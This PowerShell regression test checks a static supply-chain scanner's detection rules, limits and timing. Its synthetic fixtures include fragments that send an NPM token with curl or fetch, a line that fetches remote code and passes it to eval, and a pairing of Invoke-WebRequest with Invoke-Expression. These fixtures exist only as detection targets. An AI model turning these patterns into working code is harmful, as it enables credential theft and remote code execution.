[CmdletBinding()]
param([switch]$BenchmarkOnly)
$ErrorActionPreference='Stop'
$repoRoot=Split-Path -Parent $PSScriptRoot
$scannerPath=Join-Path $repoRoot 'Scan-DevSupplyChain.ps1'
$windowsPowerShell=Join-Path $env:SystemRoot 'System32/WindowsPowerShell/v1.0/powershell.exe'
$reportsPath=Join-Path $repoRoot 'reports'
if (Test-Path -LiteralPath $reportsPath) {
    $item=Get-Item -LiteralPath $reportsPath -Force
    if (-not $item.PSIsContainer -or ($item.Attributes -band [IO.FileAttributes]::ReparsePoint)) { throw 'Unsafe reports directory.' }
}
$artifactRoot=Join-Path $reportsPath ('scan-review-regression-'+[Guid]::NewGuid().ToString('N'))
$fixtureRoot=Join-Path $artifactRoot 'fixtures'
[void][IO.Directory]::CreateDirectory($fixtureRoot)
$cases=0; $assertions=0
function Assert-Review {
    param([bool]$Condition,[string]$Message)
    $script:assertions++
    if (-not $Condition) { throw $Message }
}
function Write-NewReviewFile {
    param([string]$Name,[string]$Text)
    $path=Join-Path $fixtureRoot $Name
    [void][IO.Directory]::CreateDirectory([IO.Path]::GetDirectoryName($path))
    $bytes=(New-Object Text.UTF8Encoding($false)).GetBytes($Text)
    $stream=[IO.File]::Open($path,[IO.FileMode]::CreateNew,[IO.FileAccess]::Write,[IO.FileShare]::None)
    try { $stream.Write($bytes,0,$bytes.Length) } finally { $stream.Dispose() }
    return (Get-Item -LiteralPath $path)
}
# Only the reviewed scanner helpers are evaluated. Generated input is never executed.
$tokens=$null; $errors=$null
$ast=[Management.Automation.Language.Parser]::ParseFile($scannerPath,[ref]$tokens,[ref]$errors)
Assert-Review (@($errors).Count -eq 0) 'Scanner parser failed.'
$main=@($ast.EndBlock.Statements | Where-Object { $_ -is [Management.Automation.Language.TryStatementAst] })[-1]
Assert-Review ($null -ne $main -and $main.Extent.Text.Contains('Initialize-ScannerContext')) 'Main boundary missing.'
$helpers=@($ast.EndBlock.Statements | Where-Object {
    $_.Extent.StartOffset -lt $main.Extent.StartOffset -and
    -not ($_ -is [Management.Automation.Language.AssignmentStatementAst] -and $_.Left.Extent.Text -in @('$script:BaseDir','$script:ScriptPath'))
})
. ([scriptblock]::Create([string]::Join([Environment]::NewLine,[string[]]@($helpers|ForEach-Object{$_.Extent.Text}))))
$script:BaseDir=$repoRoot; $script:ScriptPath=$scannerPath
$script:LauncherPath=Join-Path $repoRoot 'run-checker.bat'
$script:Quiet=$true; $script:NoColor=$true
$script:MaxFiles=200000; $script:MaxFileSizeMB=10
$script:UserProfile=$false; $script:MajorLocations=$false; $script:EndpointTelemetry=$false
$script:Deep=$false; $script:SyntheticValidation=$false
function Reset-Review {
    $script:Path=$fixtureRoot; $script:Checks=@('Packages','LifecycleScripts','AiMcp','InvisibleUnicode','ScannerSelf')
    $script:RunStartedAt=(Get-Date).ToString('o')
    $script:RunStopwatch=[Diagnostics.Stopwatch]::StartNew()
    $script:ReportDir=Join-Path $artifactRoot ('unit-'+[Guid]::NewGuid().ToString('N'))
    $script:JsonOut=''; $script:TextOut=''
    Initialize-ScannerContext
}
Reset-Review

# Identical in-memory inputs are used before/after implementation; no host files.
$manyBindings='Write-Output "synthetic"'+"`n"+([string]::Join("`n",[string[]]@(0..159|ForEach-Object{'$value'+$_+' = ''ordinary literal '+$_+''''})))
$largeJson='{"entries":['+([string]::Join(',',@((1..2500)|ForEach-Object{'{"name":"ordinary","description":"reference","version":"1.0"}'})))+']}'
$compilerText=('const option = "PUBLIC_OPTION"; // ordinary compiler record'+"`n")*18000
$fetchCall='fet'+'ch'
$secretText=('var environment = process.env.PUBLIC_SETTING; '+$fetchCall+'(publicUrl);'+"`n")*9000
$benchmarks=New-Object Collections.ArrayList
foreach($name in @('PowerShellBindings','McpDirectoryJson','IncidentMarkerText','CompilerCredentialText')) {
    $clock=[Diagnostics.Stopwatch]::StartNew(); $status='completed'
    try {
        switch($name) {
            PowerShellBindings { $null=Get-PowerShellRegexDataProjection $manyBindings }
            McpDirectoryJson { $null=Get-McpCommandText $largeJson }
            IncidentMarkerText { $null=Get-NpmIncidentContextMarker $compilerText }
            CompilerCredentialText { $null=Test-SecretHarvestingExternalSendPattern $secretText }
        }
    } catch [Text.RegularExpressions.RegexMatchTimeoutException] { $status='regex-timeout' }
    finally { $clock.Stop() }
    [void]$benchmarks.Add([ordered]@{name=$name;elapsedMs=$clock.ElapsedMilliseconds;status=$status})
}
$benchmarkJson=[ordered]@{version=$script:ScannerVersion;powershell=$PSVersionTable.PSVersion.ToString();inputLengths=@($manyBindings.Length,$largeJson.Length,$compilerText.Length,$secretText.Length);measurements=@($benchmarks.ToArray())}|ConvertTo-Json -Depth 5
$null=Write-NewReviewFile 'benchmark.json' $benchmarkJson
Write-Host $benchmarkJson
if ($BenchmarkOnly) { Write-Host ('Benchmark artifacts: '+$artifactRoot); exit 0 }

foreach($entry in $benchmarks){ Assert-Review ($entry.status -eq 'completed') ('Benchmark rule timed out: '+$entry.name) }
$cases++

# Large compiler-shaped properties and positive samples preserve the same rules.
$openProperty='process.env["'+('PUBLIC_FIELD_'*100000)+'; '+$fetchCall+'(publicUrl)'
Assert-Review (-not (Test-SecretHarvestingExternalSendPattern $openProperty)) 'Open public property became credential transfer.'
$tokenName='NPM_'+'TOKEN'
$send='cu'+'rl --data upload'
foreach($example in @(
    ($tokenName+(' '*500)+$send),
    ($send+(' '*100)+$tokenName),
    ('process.env["'+$tokenName+'"] '+$send),
    ('$'+'{{ sec'+'rets.VALUE }} '+$send),
    ($tokenName+' '+$fetchCall+(' '*900)+'("https://example.invalid/collect")'),
    ('request(publicUrl,{method'+(' '*700)+': POST}); '+$tokenName)
)) { Assert-Review (Test-SecretHarvestingExternalSendPattern $example) 'Credential/send direction or supported spelling lost.'; $cases++ }
Assert-Review (-not (Test-SecretHarvestingExternalSendPattern ($tokenName+(' '*1200)+$send))) 'Separated strings became a bounded compound.'
$cases++

$patterns=(Get-Content -LiteralPath (Join-Path $repoRoot 'iocs/suspicious-patterns.json') -Raw | ConvertFrom-Json).patterns
Reset-Review
$script:Context.iocs=@{patterns=@($patterns | Where-Object id -eq 'supplychain_local_campaign_host_marker')}
$compiler=Write-NewReviewFile 'typescript.js' $compilerText
Scan-LocalSuspiciousTextPatterns -File $compiler -Text $compilerText
Assert-Review ($script:Context.scanStats.regexMatchTimeouts -eq 0) 'Ordinary compiler text still times out.'
$domain='sky'+'leen.fr'
Scan-LocalSuspiciousTextPatterns -File $compiler -Text ('https://api.'+$domain+'/upload')
Assert-Review (@($script:Context.findings|Where-Object category -eq 'SUPPLYCHAIN_LOCAL_CAMPAIGN_HOST_MARKER').Count -eq 1) 'Subdomain marker disappeared.'
$cases++
Reset-Review
$script:Context.iocs=@{patterns=@(@{id='supplychain_local_campaign_host_marker';regex='custom-synthetic-marker';severity='WARN'})}
Scan-LocalSuspiciousTextPatterns -File $compiler -Text 'custom-synthetic-marker'
Assert-Review (@($script:Context.findings|Where-Object severity -eq 'WARN').Count -eq 1) 'An edited local expression was skipped.'
$cases++
Reset-Review
$script:Context.iocs=@{patterns=@(
    @{id='synthetic-timeout';regex='^(a+)+$';severity='WARN'},
    @{id='synthetic-after';regex='later-marker';severity='WARN'}
)}
try {
    $script:RegexMatchTimeoutSeconds=0.02
    Scan-LocalSuspiciousTextPatterns -File $compiler -Text (('a'*100000)+'! later-marker')
} finally { $script:RegexMatchTimeoutSeconds=2 }
Assert-Review ($script:Context.scanStats.regexMatchTimeouts -eq 1) 'Per-rule timeout was not recorded.'
Assert-Review (@($script:Context.findings|Where-Object category -eq 'SYNTHETIC-AFTER').Count -eq 1) 'Timeout discarded a later local rule.'
Assert-Review (@($script:Context.scannerStepPerformance.Values|Where-Object{$_.nested -and $_.timeoutCount -eq 1}).Count -eq 1) 'Nested timeout counter missing.'
Invoke-ScanPhase LoadIocs {}; Invoke-ScanPhase Project {}; Complete-ScanExecution completed; Finalize-ScanCoverage
Assert-Review (-not $script:Context.coverage.scanComplete) 'Timed-out local rule became a completed negative.'
$cases++

# Escaped command keys, directory inventories and bounded traversal.
Reset-Review
$jsonFile=Write-NewReviewFile '.claude/plugins/plugin-directory-cache-v2.json' $largeJson
Assert-Review ([string]::IsNullOrEmpty((Get-McpCommandText -Text $largeJson -File $jsonFile))) 'Reference JSON invented a command.'
Assert-Review ($script:Context.coverage.candidateFailures.Count -eq 0) 'Command-free JSON was marked incomplete.'
Assert-Review ((Get-McpCommandText '{"servers":{"s":{"\u0063ommand":"npx","args":["sample@1.0.0"]}}}') -match 'npx') 'Escaped JSON command key bypassed extraction.'
Assert-Review ((Get-McpCommandText ('command = "npx sample@1.0.0"')) -match 'npx') 'Line-based command fallback lost.'
$cases++
$deepJson=('{"nested":'*40)+'{"command":"npx sample"}'+('}'*40)
$deepFile=Write-NewReviewFile '.mcp.json' $deepJson
$null=Get-McpCommandText -Text $deepJson -File $deepFile
Assert-Review (@($script:Context.findings|Where-Object category -eq 'MCP_COMMAND_ANALYSIS_LIMIT_REACHED').Count -eq 1) 'JSON depth limit was silent.'
$wideJson='{"entries":['+([string]::Join(',',@((1..9000)|ForEach-Object{'{}'})))+'],"command":"npx late-command"}'
$wideFile=Write-NewReviewFile '.claude/wide.json' $wideJson
$null=Get-McpCommandText -Text $wideJson -File $wideFile
Assert-Review (@($script:Context.findings|Where-Object category -eq 'MCP_COMMAND_ANALYSIS_LIMIT_REACHED').Count -eq 2) 'JSON node limit was silent.'
Invoke-ScanPhase LoadIocs {}; Invoke-ScanPhase Project {}; Complete-ScanExecution completed; Finalize-ScanCoverage
Assert-Review (-not $script:Context.coverage.scanComplete) 'Truncated command extraction became a completed negative.'
$cases++

# Root and function scopes can start at offset zero but have different trust.
$fetchName='Invoke-Web'+'Request'; $executeName='Invoke-Ex'+'pression'
$scopeText='function CheckRule { param([string]$Text) $p=''_FETCH_ https://example.invalid/x | _EXEC_''; return $Text -match $p }'+[char]10+
    '$payload=''_FETCH_ https://example.invalid/x | _EXEC_'''+[char]10+'_EXEC_ $payload'
$scopeText=$scopeText.Replace('_FETCH_',$fetchName).Replace('_EXEC_',$executeName)
$scopeProjection=Get-PowerShellRegexDataProjection $scopeText
$activeOffset=$scopeText.IndexOf('$payload=')
Assert-Review (@($scopeProjection.spans|Where-Object{$_.start -gt $activeOffset}).Count -eq 0) 'Function proof leaked into the root scope.'
Assert-Review ((Get-PowerShellExternalExecutionAssessment -Text $scopeText -PassiveSpans $scopeProjection.spans).Disposition -in @('Active','Ambiguous')) 'Unknown root execution was suppressed by a scope cache collision.'
$cases++

# Counters are distinct paths; event counts describe repeat visits.
Reset-Review
for($i=0;$i -lt 3;$i++){
    Add-ScanStat -Name filesEnumerated -FilePath $compiler.FullName
    Add-ScanStat -Name filesSkipped -FilePath $compiler.FullName
}
Assert-Review ($script:Context.scanStats.filesEnumerated -eq 1 -and $script:Context.scanStats.filesSkipped -eq 1) 'Repeated selection inflated file counters.'
Assert-Review ($script:Context.scanStats.fileEnumerationEvents -eq 3 -and $script:Context.scanStats.fileSkipEvents -eq 3) 'Repeat visits lost their event counts.'
$list=New-ArrayList; $script:TargetedPerProjectFileLimit=0
Add-FileIfExists -List $list -FilePath (Join-Path $fixtureRoot 'not-present.json')
Assert-Review ($script:Context.scanStats.targetedDependencyFilesSkippedByBudget -eq 0) 'Nonexistent path consumed a sampling event.'
$script:TargetedPerProjectFileLimit=2000
$cases++

# Probe the verified marker only; unknown or changed markers remain eligible.
$script:SkipOwnSyntheticSamples=$true
$knownRoot=Join-Path $repoRoot 'tests/samples/npm-clean'
Assert-Review (-not (Test-ProjectMarkerDirectory $knownRoot)) 'Verified fixture inflated project count.'
Assert-Review ($script:Context.scanStats.syntheticSampleKnownSkipped -eq 0) 'A classification probe changed the skipped count.'
$entry=$script:Context.ownSyntheticSampleManifest.entries[(Normalize-SampleManifestKey 'npm-clean/package.json')]
Assert-Review ($null -ne $entry) 'Expected fixture manifest entry missing.'
$originalHash=$entry.sha256
try {
    $entry.sha256='0'*64
    Assert-Review (Test-ProjectMarkerDirectory $knownRoot) 'Modified fixture marker was excluded from discovery.'
} finally { $entry.sha256=$originalHash; $script:SkipOwnSyntheticSamples=$false }
$cases++

# Line-based command extraction obeys the same fragment/character budget.
Reset-Review
$manyCommands=('command = "npx sample"'+[char]10)*300
$lineFile=Write-NewReviewFile 'commands.toml' $manyCommands
$null=Get-McpCommandText -Text $manyCommands -File $lineFile
Assert-Review (@($script:Context.findings|Where-Object category -eq 'MCP_COMMAND_ANALYSIS_LIMIT_REACHED').Count -eq 1) 'Line-based extraction bypassed the fragment budget.'
$invalidJson='{"command":"npx", broken'
$invalidFile=Write-NewReviewFile 'invalid-config.json' $invalidJson
$null=Get-McpCommandText -Text $invalidJson -File $invalidFile
Assert-Review (@($script:Context.findings|Where-Object category -eq 'MCP_COMMAND_CONFIG_PARSE_FAILED').Count -eq 1) 'Malformed command-bearing JSON became a completed negative.'
$cases++

# Exact source identities refine four posture markers. Copies/changes fail closed.
Reset-Review
$script:Context.iocs=@{patterns=$patterns}
foreach($reference in @(
    @{path='.github/workflows/validate.yml';rule='glassworm-c2-marker'},
    @{path='tests/Test-IocMaintenance.ps1';rule='keyv_chaindrop_nodereal_contract_marker'},
    @{path='tests/Test-SecurityUpdate20261006.ps1';rule='supplychain_local_campaign_host_marker'}
)){
    $file=Get-Item -LiteralPath (Join-Path $repoRoot $reference.path)
    $source=[IO.File]::ReadAllText($file.FullName)
    Assert-Review (Test-VerifiedSelfTestMarkerReference -File $file -Text $source -RuleId $reference.rule) 'Shipped source hash drifted.'
    Assert-Review (-not (Test-VerifiedSelfTestMarkerReference -File $file -Text ($source+' ') -RuleId $reference.rule)) 'Changed source inherited reference status.'
    Assert-Review (-not (Test-VerifiedSelfTestMarkerReference -File $compiler -Text $source -RuleId $reference.rule)) 'External copy inherited reference status.'
    if($reference.rule -eq 'glassworm-c2-marker'){ Scan-GlassWormBehavior -File $file -Text $source }
    else { Scan-LocalSuspiciousTextPatterns -File $file -Text $source }
    $cases++
}
Assert-Review (@($script:Context.findings|Where-Object category -eq 'SCANNER_TEST_MARKER_REFERENCE').Count -eq 4) 'Reviewed marker references were not INFO.'
Assert-Review (@($script:Context.findings|Where-Object severity -eq 'WARN').Count -eq 0) 'Reviewed source still produced posture WARNs.'

# Shared timing origin and bounded redacted slow reading/file records.
Reset-Review
Invoke-ScanPhase LoadIocs {}; Invoke-ScanPhase Project {}; Complete-ScanExecution completed
$execution=Get-ScanExecutionSummary
$duration=([DateTimeOffset]::Parse($execution.finishedAt)-[DateTimeOffset]::Parse($execution.startedAt)).TotalMilliseconds
Assert-Review ([Math]::Abs($duration-$execution.elapsedMs) -lt 0.01) 'Start/finish and elapsed use different origins.'
for($i=0;$i -lt 25;$i++){
    Register-ScannerActivityPerformance -Name Reading -ElapsedTicks ([int64]([Diagnostics.Stopwatch]::Frequency*(2.0+$i/1000.0))) -File $compiler
}
$timing=Get-ScannerPerformanceSummary
Assert-Review ($timing.slowActivities.Count -eq 20 -and $timing.slowActivities[0].elapsedMs -eq 2024) 'Slow-activity retention or order incorrect.'
Assert-Review (-not $timing.slowActivities[0].partition) 'Reading was an additive timing partition.'
Assert-Review (-not ($timing.slowActivities|ConvertTo-Json -Compress).Contains($env:USERPROFILE)) 'Slow activities exposed the profile path.'
$cases++

# An active tail in compiler-shaped content remains detectable.
$active=$fetchCall+'("https://example.invalid/payload").then(x=>x.text()).then(code=>'+'ev'+'al(code));'
$scanRoot=Join-Path $fixtureRoot 'integration'
$null=Write-NewReviewFile 'integration/negative.js' ($secretText*8)
$null=Write-NewReviewFile 'integration/active.js' ($compilerText+$active)
$jsonOut=Join-Path $artifactRoot 'integration.json'
$txtOut=Join-Path $artifactRoot 'integration.txt'
$console=@(& $windowsPowerShell -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass -File $scannerPath -Path $scanRoot -Checks Recommended -JsonOut $jsonOut -TextOut $txtOut -NoColor)
$scanExit=$LASTEXITCODE; $global:LASTEXITCODE=0
$report=[IO.File]::ReadAllText($jsonOut)|ConvertFrom-Json
Assert-Review ($scanExit -eq 2) 'Active compiler-shaped sample lost exit code 2.'
Assert-Review (@($report.findings|Where-Object{$_.category -eq 'PACKAGE_CODE_EXTERNAL_EXECUTION' -and $_.severity -eq 'DANGER'}).Count -ge 1) 'Active tail signal disappeared.'
Assert-Review ($report.scanComplete -and $report.scanStats.regexMatchTimeouts -eq 0 -and $report.scanStats.scannerFileErrors -eq 0) 'Large synthetic integration incomplete.'
Assert-Review (($console -join ' ').Contains('Findings by severity:')) 'Console severity counts missing.'
Assert-Review ($report.performance.slowActivities -is [array]) 'Slow-activity JSON lost array shape.'
Assert-Review ($report.scanStats.PSObject.Properties.Match('fileEnumerationEvents').Count -eq 1 -and $report.scanStats.PSObject.Properties.Match('fileSkipEvents').Count -eq 1) 'Event counters missing from JSON.'
Assert-Review ($report.executionSafety.networkAccess -eq 'none' -and $report.executionSafety.targetCodeExecution -eq 'none') 'Offline/static contract changed.'
$cases++
Write-Host ('Scan review regressions passed: {0} cases, {1} assertions. Artifacts: {2}' -f $cases,$assertions,$artifactRoot)
